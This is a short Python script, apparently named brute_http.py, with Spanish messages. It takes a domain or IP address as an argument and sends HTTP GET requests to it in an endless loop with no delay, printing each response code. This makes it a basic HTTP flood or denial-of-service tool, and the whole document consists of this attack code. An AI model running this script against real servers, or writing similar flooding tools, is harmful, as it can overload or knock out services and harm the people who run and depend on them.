import requests
import sys

if len(sys.argv) != 2:
    print("Uso: python3 brute_http.py <dominio_o_IP>")
    sys.exit(1)

dominio = sys.argv[1]

while True:
    try:
        response = requests.get(dominio)
        print(f"Petición enviada a {dominio}, código de respuesta: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error al hacer la petición: {e}")
